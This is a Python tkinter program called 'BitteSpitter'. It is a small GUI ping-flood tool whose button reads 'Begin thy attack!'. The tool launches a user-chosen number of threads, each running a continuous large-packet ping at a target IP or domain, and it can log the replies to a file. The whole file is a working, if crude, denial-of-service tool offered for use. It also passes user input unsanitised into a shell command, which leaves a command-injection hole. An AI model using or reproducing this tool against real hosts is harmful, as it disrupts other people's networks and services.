import tkinter as tk
import subprocess
import threading
import time as t
import random
nom = 0
makefi = ''
      
      
def pingstuff(): 
   global nom
   global makefi
   if addrtofile.get() == 'y' and nom != 1:
      makefi = f'bittespitterlog{str(random.randrange(1, 9))}{str(random.randrange(1, 9))}{str(random.randrange(1, 9))}{str(random.randrange(1, 9))}.txt' 
      nom = 1
    
   ip = ipip.get()
   packetsize = bs.get()
   command = f'ping -t {ip} -l {packetsize}'
   process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
   while True:
        output = process.stdout.readline()
        if addrtofile.get() == 'y':
          with open(makefi, 'a') as f:
            f.write(f'{str(output).strip()} \n')
        if output == b'' and process.poll() is not None:
            break
        if output:
            print(output.decode('utf-8').strip())

def beginping():
    try: 
      tam = int(ta.get())
      title.config(fg='white', bg='#1a3056', font=(mainfont, mainfontsize), text='BitteSpitter')
      cftam = tam
      while cftam != 0:
         threading.Thread(target=pingstuff, args=()).start()
         cftam -= 1
    except ValueError:
        title.config(fg='red', bg='#1a3056', font=(mainfont, mainfontsize), text='ERROR!')
        
        def sleepy():
          
          t.sleep(2)
          title.config(fg='white', bg='#1a3056', font=(mainfont, mainfontsize), text='BitteSpitter')
        threading.Thread(target=sleepy).start()


        

    


mainfont = 'Arial'
mainfontsize = 30

root = tk.Tk()
root.config(bg='#1a3056')
root.title('Bittespitter')
root.geometry('500x350')

title = tk.Label(root, fg='white', bg='#1a3056', font=(mainfont, mainfontsize), text='BitteSpitter')
title.pack(pady=15)

orow = tk.Frame(root)
orow.columnconfigure(0, weight=1)
orow.columnconfigure(1, weight=1)
ts = tk.Label(orow, fg='white', bg='#1a3056', font=(mainfont, 12), text='Thread Amount:   ',
               highlightthickness=3, highlightbackground='white')

ts.grid(column=0, row=1, sticky=tk.W+tk.E)
ta = tk.Entry(orow, font=(mainfont, 12), fg='white', bg='#1a3056',
               insertbackground='white', highlightbackground='white', highlightthickness=3,)

orow1 = tk.Frame(root)
orow1.columnconfigure(0, weight=1)
orow1.rowconfigure(0, weight=1)
orow1.rowconfigure(1, weight=1)
orow1.rowconfigure(2, weight=1)
orow1.rowconfigure(3, weight=1)

bts = tk.Button(orow1, bg='#1a3056', fg='white', activeforeground='white',
                text='Begin thy attack!', font=(mainfont, 17), activebackground='#1a3056',highlightcolor='#1a3056', highlightthickness=0, command=beginping)
bts.grid(row=3, column=0, sticky=tk.W+tk.E)


ta.grid(column=1, row=1, sticky=tk.W+tk.E)

ipi = tk.Label(orow, fg='white', bg='#1a3056', font=(mainfont, 12), text='IP or Domain:   ',
               highlightthickness=3, highlightbackground='white')

ipi.grid(column=0, row=2, sticky=tk.W+tk.E)
ipip = tk.Entry(orow, font=(mainfont, 12), fg='white', bg='#1a3056',
               insertbackground='white', highlightbackground='white', highlightthickness=3,)
ipip.grid(column=1, row=2, sticky=tk.W+tk.E)

bl = tk.Label(orow, fg='white', bg='#1a3056', font=(mainfont, 12), text='Packet size:   ',
               highlightthickness=3, highlightbackground='white')

bl.grid(column=0, row=3, sticky=tk.W+tk.E)
bs = tk.Entry(orow, font=(mainfont, 12), fg='white', bg='#1a3056',
               insertbackground='white', highlightbackground='white', highlightthickness=3,)
bs.grid(column=1, row=3, sticky=tk.W+tk.E)


addrtofilet = tk.Label(orow, 
                            bg='#1a3056', 
                            fg='white', 
                            text='Save output to file? (y/n)', 
                            font=(mainfont, 12), 
                            activebackground='#1a3056',
                            activeforeground='white',)


addrtofilet.grid(row=4, column=0, sticky=tk.W+tk.E)

addrtofile = tk.Entry(orow, 
                            bg='#1a3056', 
                            fg='white', 
                            font=(mainfont, 12),
                            highlightbackground='white', 
                            highlightthickness=3)


addrtofile.grid(row=4, column=1, sticky=tk.W+tk.E)

orow.pack(fill='x')
orow1.pack(fill='x')

root.mainloop()